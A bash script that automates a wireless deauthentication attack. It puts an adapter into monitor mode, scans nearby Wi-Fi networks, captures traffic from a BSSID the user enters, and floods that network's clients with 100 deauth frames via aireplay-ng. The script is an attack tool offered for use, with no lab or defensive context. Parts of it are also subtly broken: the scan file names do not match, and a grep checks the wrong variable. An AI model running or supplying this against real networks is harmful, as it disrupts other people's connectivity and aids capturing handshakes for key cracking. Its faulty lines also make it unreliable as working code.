#!/bin/bash
usb=$(lsusb)
echo "$usb"
DEVICE_ID="0bda:8187"

# Check if lsusb output contains that ID

if lsusb | grep -q "$DEVICE_ID"; then
    echo " USB device ($DEVICE_ID) is connected."
else
    echo " USB device ($DEVICE_ID) not found."
exit 
fi

# killing supplicant(wpa)

killconfliting=$(sudo airmon-ng check kill)
echo "$killconfliting"

# checking monitor mode enabled

monitormodeenabled=$(sudo airmon-ng start wlan0)
echo "$monitormodeenabled"
if sudo airmon-ng start wlan0 | grep -q "$$monitormodeenabled";then
echo "($monitormodeenabled)"
else
echo "($monitormodeenabled)"
fi

#checking wifi around us 

sudo timeout 10 airodump-ng wlan0 --write scan4 --output-format csv --write-interval 1

#reading the  wifi available around as

wifi_data=$(cat scan-01.csv)
echo "$wifi_data"
#entering macaddress and  channelno
read -p "Enter channel number: " channelno
read -p "Enter MAC address: " macaddress
sudo airodump-ng -w wificapture23 -c "$channelno" --bssid "$macaddress" wlan0

#deauthenticating clients

deauth=$(sudo aireplay-ng --deauth 100 -a "$macaddress" wlan0)
echo "$deauth"
